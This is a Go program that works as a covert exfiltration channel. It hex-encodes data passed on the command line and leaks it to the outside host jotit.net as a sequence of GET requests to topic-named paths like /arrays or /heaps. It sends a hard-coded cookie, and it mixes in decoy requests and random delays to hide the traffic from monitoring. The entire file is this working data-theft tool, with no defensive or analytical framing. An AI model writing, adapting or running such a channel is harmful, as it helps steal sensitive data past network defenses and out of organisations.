package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"time"
)

func main() {
	url := "http://www.jotit.net"

	endpointDict := map[string]string{
		"0": "/arrays",
		"1": "/linked-lists",
		"2": "/stacks",
		"3": "/queues",
		"4": "/hash-tables",
		"5": "/trees",
		"6": "/graphs",
		"7": "/heaps",
		"8": "/tries",
		"9": "/graphs-algorithms",
		"a": "/dynamic-programming",
		"b": "/sorting-algorithms",
		"c": "/search-algorithms",
		"d": "/object-oriented-programming",
		"e": "/divide-and-conquer",
		"f": "/greedy-algorithms",
	}

	dummyEndpoints := [4]string{
		"/backtracking",
		"/bit-manipulation",
		"/dynamic-memory-allocation",
		"/machine-learning"}

	data := ""
	// fmt.Println("Enter sensitive information")
	// fmt.Scanln(&data)
	data = os.Args[1]
	// converts from string to array of bytes
	hexArrayTemp := make([]string, len(data))
	for i, char := range data {
		hexArrayTemp[i] = fmt.Sprintf("%02x", char)
	}
	// converts from array of bytes to array of nibbles
	hexArray := make([]string, len(data)*2)
	for i := 0; i < len(hexArray); i += 2 {
		charString := hexArrayTemp[i/2]
		hexArray[i] = string(charString[0])
		hexArray[i+1] = string(charString[1])
	}
	// converts from array of nibbles to array of URL endpoints
	endpoints := make([]string, len(hexArray))
	for i := 0; i < len(hexArray); i++ {
		endpoints[i] = endpointDict[hexArray[i]]
		//fmt.Print(hexArray[i])
	}

	// sends an initial call to server with cookie
	resp, err := initialCall()
	if err != nil {
		fmt.Println(err)
	} else {
		defer resp.Body.Close()

		// fmt.Println(resp.StatusCode)
		for i := 0; i < len(endpoints); i++ {
			// randomly sends a GET request to a random dummy endpoint 25% of the time
			if rand.Float32() < 0.25 {
				resp, err := http.Get(url + dummyEndpoints[rand.Intn(3)])
				sleepRandom()
				if err != nil {
					fmt.Println(err)
				} else {
					// fmt.Printf("dummy: %d\n", resp.StatusCode)
					defer resp.Body.Close()

				}
			}
			// sends a GET request to each endpoint in array
			resp, err := http.Get(url + endpoints[i])
			sleepRandom()
			if err != nil {
				fmt.Println(err)
			} else {
				// fmt.Printf("msg: %d\n", resp.StatusCode)
				defer resp.Body.Close()

			}
			defer resp.Body.Close()
		}

	}
}

func sleepRandom() {
	minDuration := 0.5 // Minimum duration in seconds
	maxDuration := 1.5 // Maximum duration in seconds

	// Generate a random duration within the given range
	rand.Seed(time.Now().UnixNano())
	duration := minDuration + rand.Float64()*(maxDuration-minDuration)

	// Convert duration to milliseconds
	sleepTime := time.Duration(duration*1000) * time.Millisecond

	time.Sleep(sleepTime)
}

func initialCall() (*http.Response, error) {
	// Create an HTTP client with a custom cookie jar
	client := &http.Client{
		Jar: newCustomCookieJar("username", "jamescharles5462456"),
	}

	// Create a new GET request
	req, err := http.NewRequest("GET", "http://www.jotit.net/arrays", nil)
	if err != nil {
		return nil, err
	}

	// Send the GET request
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return resp, nil
}

// CustomCookieJar is a custom implementation of http.CookieJar
// that allows setting a user-defined cookie.
type CustomCookieJar struct {
	cookie *http.Cookie
}

func newCustomCookieJar(name string, value string) *CustomCookieJar {
	return &CustomCookieJar{
		cookie: &http.Cookie{
			Name:    name,
			Value:   value,
			Expires: time.Now().Add(24 * time.Hour), // Set the cookie expiration time as desired
		},
	}
}

func (jar *CustomCookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	// Set the user-defined cookie for the given URL
	cookies = append(cookies, jar.cookie)
}

func (jar *CustomCookieJar) Cookies(u *url.URL) []*http.Cookie {
	return []*http.Cookie{jar.cookie}
}
